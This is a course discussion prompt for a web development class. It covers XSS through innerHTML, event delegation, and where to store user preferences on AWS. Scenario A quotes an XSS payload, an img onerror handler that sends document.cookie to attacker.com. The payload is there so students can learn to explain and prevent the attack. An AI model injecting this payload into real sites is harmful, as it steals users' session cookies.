# Discussion Forum: Module 04 - JavaScript DOM Manipulation

**Course:** CIS-3340 Full Stack Web Development
**Texas Wesleyan University | Professor Nash**

---

## Overview

This week's discussion connects DOM manipulation patterns to real security, performance, and architecture decisions. Choose one scenario and write an initial post addressing all three sub-questions.

---

## Scenario A: XSS Vulnerability in a User-Generated Content Feature

A developer builds a comments section for a blog. Comments are stored in a database and retrieved via a REST API. The developer renders each comment like this:

```javascript
const comment = { author: 'Alice', text: 'Great article!' };
const div = document.createElement('div');
div.innerHTML = `<strong>${comment.author}:</strong> ${comment.text}`;
container.appendChild(div);
```

A security researcher submits a comment with the following text:

```
<img src="x" onerror="fetch('https://attacker.com/steal?c=' + document.cookie)">
```

When any other user views the page, the researcher's cookie-stealing script fires automatically.

Address all three of the following in your post:

1. Explain precisely why this attack works. Walk through the chain of events from the malicious comment being stored to the `fetch()` executing in another user's browser. Identify the specific line of code that enables the attack.
2. Propose the minimal code change that prevents this attack while keeping the same visual output. Show the corrected code and explain why your fix is effective.
3. In the context of AWS deployments: if this application's API was hosted on API Gateway and Lambda, and the comment data was stored in DynamoDB, at which layer would you implement server-side sanitization? Is client-side-only sanitization sufficient? Why or why not?

Your initial post should be 175 to 225 words.

---

## Scenario B: Performance Audit of a DOM-Heavy Dashboard

A company's internal dashboard renders a project tracking table with 500 rows on page load. Each row has three buttons: Edit, Delete, and Archive. A junior developer attached event listeners to all 1,500 buttons on page load. During a performance audit, the team finds that the initial page load takes 4 seconds — 3.5 seconds of which is JavaScript execution time for attaching listeners.

Address all three of the following in your post:

1. Explain how attaching 1,500 individual event listeners to DOM elements impacts memory and initial load time. Use your understanding of how JavaScript registers listeners internally to explain the overhead.
2. Refactor the listener code to use event delegation. Show the delegated listener code for the table's `<tbody>` element, and explain how you would identify which button type (Edit, Delete, or Archive) was clicked.
3. After the refactor, new rows are added to the table dynamically when the user clicks "Add Project." Explain why the delegated listener approach handles these new rows correctly while the original 1,500-listener approach would not.

Your initial post should be 175 to 225 words.

---

## Scenario C: localStorage vs. Server-Side State for a React App on AWS

A team is building a React application deployed to AWS S3 and CloudFront. The app allows users to customize their dashboard layout: pinned widgets, column order, and color theme. A debate arises about where to store this preference state: in `localStorage` on the client, or in a user profile record in DynamoDB (accessed via API Gateway and Lambda).

Address all three of the following in your post:

1. Describe at least three technical limitations of `localStorage` that make it unsuitable as the sole storage mechanism for user preferences in a production application. Consider cross-device behavior, data persistence guarantees, and storage capacity.
2. Describe the trade-offs of storing preferences in DynamoDB via API Gateway. What does this approach gain over `localStorage`? What does it cost in terms of network latency, API Gateway invocation cost, and implementation complexity?
3. Propose a hybrid strategy that uses `localStorage` as a client-side cache for preferences that are ultimately persisted to DynamoDB. Describe the read and write flow — when does the app read from `localStorage`, when does it read from DynamoDB, and when does it write to each?

Your initial post should be 175 to 225 words.

---

## Peer Response Instructions

Write a substantive reply to at least two classmates who chose scenarios different from yours. Each peer response must be at least 75 words and must:

- Correct a technical inaccuracy with a specific explanation, or
- Add AWS-specific context, a security consideration, or a performance data point, or
- Present an alternative implementation and compare its trade-offs

---

## Due Dates

- Initial post: Wednesday by 11:59 PM
- Peer responses (at least two): Sunday by 11:59 PM

---

## Grading Rubric

| Criterion | Points |
|---|---|
| Initial post addresses all three sub-questions with technical accuracy | 3 |
| Initial post meets the 175 to 225 word count requirement | 1 |
| Initial post uses correct JavaScript and/or security terminology | 1 |
| First peer response is substantive (75+ words, adds value) | 2 |
| Second peer response is substantive (75+ words, adds value) | 2 |
| Posts submitted by the stated deadlines | 1 |
| **Total** | **10** |

---

## Professor Nash Note

XSS via `innerHTML` is one of the OWASP Top 10 vulnerabilities — it appears in real production applications at companies of all sizes. When I see `innerHTML` with a template literal containing user data, I immediately look for where that data is sanitized. If I do not find sanitization, that is a failing security review. As you build React applications in later modules, remember that JSX automatically escapes values before rendering them — that is React's built-in XSS protection. But the raw DOM API has no such protection. Know the difference.
